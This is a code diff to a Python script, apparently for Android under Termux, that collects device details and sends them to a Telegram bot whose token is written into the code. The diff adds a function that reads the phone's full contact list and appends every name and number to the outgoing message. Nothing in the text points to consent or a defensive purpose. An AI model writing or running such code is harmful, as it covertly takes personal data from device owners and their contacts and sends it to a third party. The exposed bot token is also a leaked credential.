@@ -1,6 +1,7 @@
 import os
 import requests
 import socket
+import json
 
 # Replace with your bot token and chat ID
 TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
@@ -22,6 +23,25 @@ def send_to_telegram(message):
             print(f"Failed to send message. Status code: {response.status_code}")
     except Exception as e:
         print(f"Error sending message: {str(e)}")
+
+# Function to gather contact list
+def get_contact_list():
+    try:
+        contacts = os.popen('termux-contact-list').read().strip()
+        contacts_json = json.loads(contacts)
+        contact_numbers = []
+        
+        for contact in contacts_json:
+            # Collect phone numbers
+            if 'number' in contact:
+                contact_numbers.append(f"{contact['name']}: {contact['number']}")
+        
+        if contact_numbers:
+            return "\n".join(contact_numbers)
+        else:
+            return "No contacts found."
+    except Exception as e:
+        return f"Error getting contact list: {str(e)}"
 
 # Function to gather device info
 def get_device_info():
@@ -47,6 +67,9 @@ def get_device_info():
         # Get storage info
         storage_info = os.popen('df -h /data').read().strip()
 
+        # Get contacts info
+        contact_info = get_contact_list()
+
         # Prepare message to send
         message = (
             f"*Device Info*\n"
@@ -56,7 +79,8 @@ def get_device_info():
             f"Operator Info: `{operator_info}`\n"
             f"OS Info: `{os_info}`\n"
             f"Battery Info: `{battery_info}`\n"
-            f"Storage Info: `{storage_info}`"
+            f"Storage Info: `{storage_info}`\n\n"
+            f"*Contacts List:*\n{contact_info}"
         )
 
         # Send the collected info to Telegram
